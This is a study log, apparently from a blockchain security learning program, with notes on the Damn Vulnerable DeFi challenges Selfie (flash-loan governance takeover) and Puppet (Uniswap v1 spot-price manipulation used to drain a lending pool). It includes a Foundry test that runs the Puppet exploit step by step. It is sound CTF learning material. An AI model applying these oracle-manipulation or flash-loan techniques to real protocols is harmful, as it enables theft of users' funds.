---
timezone: Asia/Shanghai 
---

# Lori

1. 自我介绍
[Lori](https://www.notion.so/Lori-b62d3531f44f467baa56ddb161f0ef3e?pvs=21), 研三在读学生，研究方向为区块链安全。

2. 你认为你会完成本次残酷学习吗？
保证至少能够完成90%，并参加 BlazCTF。

## Notes

<!-- Content_START -->

### 2024.07.11

Ethernaut 之前我已经做完了了，写了部分[解析和PoC](https://github.com/Chocolatieee0929/ContractSafetyStudy/tree/main/ethernaut).
damn-vulnerable-defi 写了一半，接下来会接着完成剩余的部分，前面3天先复习。
[Selfie](https://github.com/Chocolatieee0929/ContractSafetyStudy/blob/main/damn-vulnerable-defi/test/Levels/selfie/Selfie.t.sol)
这是有关治理投票的相关攻击，算是比较经典的。
我们注意到，想要提出的提案必须满足以下条件：
1. 提案者必须拥有足够的投票权（在上次快照时间拥有超过DVT总供应量的一半）
2. 接收者不能是治理合约本身msg.sender
第一点，由于没有对持有代币时间的限制，攻击者可以通过闪电贷来绕过第一点的检查。

### 2024.07.12

[Puppet](https://github.com/Chocolatieee0929/ContractSafetyStudy/tree/main/damn-vulnerable-defi/test/Levels/puppet)
Root cause：Spot price
这是一个lending protocol, 通过uniswapv1交易对的瞬时价格来计算coll，攻击者可以通过swap来影响价格，从而掏空池子。

log：
```
function testExploit_Puppet() public {
        uint256 v1PairBalance = dvt.balanceOf(address(puppetPool));
        console.log("v1PairBalance:", v1PairBalance);

        /* 
         * 1. 将 eth/dvt 降低，通过swap 9.9 eth，可以考虑将1000e18 dvt注入池子
         * 2. 将lending pool的钱通过借款借款 
         */
        emit log("-------------------------- before attack ---------------------------------");
        
        uint256 eth1 = calculateTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE);
        uint256 eth2 = calculateTokenToEthInputPrice(UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE);
        
        emit log_named_decimal_uint("getTokenToEthInputPrice", uniswapExchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE), 18);
        emit log_named_decimal_uint("attacker use ATTACKER_INITIAL_TOKEN_BALANCE to swap eth1", eth1, 18);
        emit log_named_decimal_uint("attacker use UNISWAP_INITIAL_TOKEN_RESERVE to swap eth1", eth2, 18);
        
        uint256 shouldETH = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        emit log_named_decimal_uint("attacker should spend ETH amount", shouldETH, 18);
        emit log_named_decimal_uint("attacker actually hold ETH amount", address(attacker).balance, 18);

        emit log("-------------------------- after attack ---------------------------------");
        vm.startPrank(attacker);
        // 1. 将 eth/dvt 降低，通过swap 9.9 eth，可以考虑将1000e18 dvt注入池子
        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, block.timestamp + 1 days);
        shouldETH = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        emit log_named_decimal_uint("attacker should spend ETH amount", shouldETH, 18);
        emit log_named_decimal_uint("attacker actually hold ETH amount", address(attacker).balance, 18);

        // 2. 将lending pool的钱通过借款借款 
        puppetPool.borrow{value: shouldETH}(POOL_INITIAL_TOKEN_BALANCE);
        vm.stopPrank();
        
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }
```

<!-- Content_END -->
